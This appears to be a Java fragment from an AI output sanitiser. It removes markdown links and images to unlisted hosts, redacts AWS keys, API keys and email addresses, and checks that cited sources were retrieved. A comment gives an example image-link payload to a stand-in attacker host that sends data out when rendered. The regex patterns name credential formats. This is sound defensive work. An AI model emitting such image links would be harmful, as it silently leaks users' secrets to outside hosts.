private static final Pattern MD_LINK = Pattern.compile("(!?)\\[([^\\]]*)]\\(([^)\\s]+)[^)]*\\)");
private static final List<Pattern> SECRETS =
        List.of(
                Pattern.compile("\\bAKIA[0-9A-Z]{16}\\b"),
                Pattern.compile("\\bsk-[A-Za-z0-9_-]{20,}\\b"),
                Pattern.compile("[\\w.+-]+@[\\w-]+\\.[\\w.-]+"));

/**
 * Removes links and images to unknown hosts. A rendered image is fetched automatically, so
 * ![x](https://evil.example/?d=SECRET) would send data out with no click.
 */
String stripUnknownLinks(String text, Set<String> allowedHosts) {
    return MD_LINK.matcher(text)
            .replaceAll(
                    m -> {
                        String label = Matcher.quoteReplacement(m.group(2));
                        return allowedHosts.contains(hostOf(m.group(3)))
                                ? Matcher.quoteReplacement(m.group())
                                : label;
                    });
}

private String hostOf(String url) {
    try {
        String host = new URI(url).getHost();
        return host == null ? "" : host.toLowerCase();
    } catch (URISyntaxException e) {
        return "";
    }
}

String redactSecrets(String text) {
    for (Pattern p : SECRETS) text = p.matcher(text).replaceAll("[removed]");
    return text;
}

/** The model may only cite sources it was actually given. */
boolean citationsValid(Collection<String> cited, Set<String> retrieved) {
    return retrieved.containsAll(cited);
}
